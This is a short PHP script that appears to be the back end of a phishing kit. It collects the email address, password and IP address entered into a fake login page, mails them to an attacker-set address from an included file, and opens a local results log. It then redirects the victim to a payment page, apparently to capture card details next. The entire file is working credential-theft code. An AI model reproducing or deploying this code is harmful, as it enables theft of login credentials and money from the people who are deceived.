<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$email = $_POST['email'];
$msg = "
-----------New Login By Vendetta-Dz----------------->
Email Address : ".$_POST['email']."
Password : ".$_POST['password']."
IP : $ip
==================================";

include 'email.php';
$subj = "Login de [$email] // - $ip";
$headers .= "Content-Type: text/plain; charset=UTF-8\n";
$headers .= "Content-Transfer-Encoding: 8bit\n";
mail("$to", $subj, $msg,"$headers");
$file = fopen("./Rzlt//Rzlt.txt","ab");
include 'hostname_check.php';

header("Location:payment.php?ip=$ip");
?>